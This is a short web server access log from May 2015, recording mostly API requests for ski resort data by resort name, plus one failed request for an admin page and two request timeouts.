170.75.162.130 - - [04/May/2015:22:58:35 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 955 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:23:00:15 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 956 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:23:00:15 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1021 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:23:00:16 -0700] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 962 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:23:00:16 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 986 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:23:00:16 -0700] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 965 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:23:02:25 -0700] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 944 "-" "node-superagent/0.18.2"
91.224.154.252 - - [04/May/2015:23:02:58 -0700] "GET http://WHERESHOULDISKI.COM/administrator/index.php HTTP/1.1" 404 495 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.2) Gecko/2008091620 Firefox/3.0.2"
170.75.162.130 - - [04/May/2015:23:03:15 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 984 "-" "node-superagent/0.18.2"
170.75.162.130 - - [04/May/2015:23:03:56 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1063 "-" "node-superagent/0.18.2"
123.125.71.36 - - [04/May/2015:23:04:01 -0700] "-" 408 0 "-" "-"
220.181.108.115 - - [04/May/2015:23:09:17 -0700] "-" 408 0 "-" "-"
